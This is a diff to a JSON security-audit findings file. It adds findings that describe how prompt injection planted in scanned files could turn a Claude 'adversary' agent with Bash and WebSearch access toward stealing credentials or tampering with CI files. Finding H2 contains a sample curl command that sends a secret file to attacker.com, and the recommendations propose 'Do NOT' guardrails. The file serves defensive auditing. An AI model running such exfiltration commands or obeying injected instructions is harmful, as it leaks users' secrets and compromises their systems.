@@ -1,6 +1,6 @@
 {
-  "scan_date": "2026-06-03",
-  "commit": "d974617",
+  "scan_date": "2026-06-29",
+  "commit": "cd17225",
   "findings": [
     {
       "id": "L2",
@@ -241,6 +241,42 @@
       "issue": "The validate_oidc_token function now supports three OIDC issuers (primary Keycloak, stage EmployeeIDP, production EmployeeIDP). Issuer routing is based on the unverified 'iss' claim from the token — validated before signature check but used to select which JWKS endpoint to validate against. There is no replay protection: a valid token can be submitted multiple times within its expiry window to create multiple investigations. There is also no rate limiting on the Lambda function URL itself.",
       "impact": "An attacker who obtains a valid short-lived OIDC token (e.g., from a phished SRE, log leak, or intercepted request) can replay it to create multiple ECS tasks and EFS access points until the token expires, potentially exhausting EFS access point quotas or running up ECS costs. With three supported issuers, compromising any one IdP's signing key would allow forging tokens accepted by the Lambda.",
       "recommendation": "1. Implement token replay protection using a DynamoDB or ElastiCache nonce store keyed on the token jti claim. 2. Add Lambda concurrency throttling and consider AWS WAF rate limiting on the function URL. 3. Regularly rotate JWKS and monitor for unexpected issuer configurations."
+    },
+    {
+      "id": "H2",
+      "title": "Adversary Agent Has Unrestricted Bash Tool Enabling Prompt-Injection-Driven Exfiltration",
+      "severity": "high",
+      "category": "Agent/Skill — Unrestricted Tool Access",
+      "file": ".claude/agents/adversary.md",
+      "line": 4,
+      "end_line": null,
+      "issue": "The adversary agent declares `tools: Read, Grep, Glob, Bash, WebSearch` with no Bash command scoping. The agent also intentionally reads untrusted code files as part of its security scanning workflow. An adversary who controls any file the agent scans (e.g., a dependency manifest, a code comment, or a config file) could embed a prompt injection that instructs the agent to execute arbitrary shell commands via Bash — including outbound data transfers (e.g., `curl https://attacker.com --data @/path/to/secret`).",
+      "impact": "A successful prompt injection could exfiltrate AWS credentials, OIDC tokens, kubeconfig files, or any secret accessible from the SRE's working directory. Because the agent runs with the SRE's shell permissions, the blast radius equals the SRE's local privilege level.",
+      "recommendation": "Scope Bash to read-only git and grep operations: replace `Bash` with `Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(grep *)`, `Bash(find *)` in the tools frontmatter. For the required write to adversary-findings.json, add the `Write` tool explicitly and remove the implicit Bash-write pattern. This limits Bash to safe operations while eliminating the network-call attack surface."
+    },
+    {
+      "id": "H3",
+      "title": "Adversary Agent Read + WebSearch Lacks Explicit Data-Exfiltration Guard",
+      "severity": "high",
+      "category": "Agent/Skill — Data Exfiltration Path",
+      "file": ".claude/agents/adversary.md",
+      "line": 1,
+      "end_line": 156,
+      "issue": "The agent has both `Read` (reads all local files including secrets) and `WebSearch` (sends queries to external search engines) in its tool list. No instruction in the agent definition prevents the agent from including local file contents or secret values in WebSearch queries. A prompt injection in scanned code could instruct the agent to embed extracted secrets in search queries, leaking them to the search provider.",
+      "impact": "Credentials, API keys, or sensitive configuration values visible in scanned files could be exfiltrated through search query telemetry to the search engine provider. This is a lower-fidelity exfiltration channel than Bash+curl (H2) but requires no network-call capability beyond the approved tool set.",
+      "recommendation": "Add an explicit constraint to the agent instructions: 'Do NOT include file contents, secret values, credentials, or sensitive data extracted from scanned files in WebSearch queries or WebFetch URLs. WebSearch is only permitted for threat intelligence lookups using package names and CVE identifiers.'"
+    },
+    {
+      "id": "M13",
+      "title": "Adversary Agent Missing Explicit File-Write Scope Constraint",
+      "severity": "medium",
+      "category": "Agent/Skill — Missing Safety Guardrails",
+      "file": ".claude/agents/adversary.md",
+      "line": 159,
+      "end_line": 201,
+      "issue": "The Output Format section instructs the agent to write findings to `adversary-findings.json`, but the agent definition contains no explicit constraint preventing it from writing to other files. With unrestricted Bash access, a prompt injection could cause the agent to overwrite project source files, CI configuration, or secrets. The agent-skill-security.md reference that is part of this same PR explicitly flags 'Missing safety guardrails | Agent instructions without explicit do NOT constraints | MEDIUM'.",
+      "impact": "A manipulated agent could overwrite `deploy/regional/*.tf`, `.github/workflows/*.yml`, or `entrypoint.sh`, introducing backdoors into infrastructure definitions or CI pipelines. The SARIF upload workflow would then surface the tampered content as an authorized security scan result.",
+      "recommendation": "Add explicit guardrails to the agent definition: 'Do NOT write to any file other than adversary-findings.json at the repository root. Do NOT modify source code, infrastructure files, CI/CD configurations, or any file in deploy/, lambda/, .github/, or internal/. Do NOT execute git push, git commit, or any command that modifies remote state.'"
     }
   ]
 }
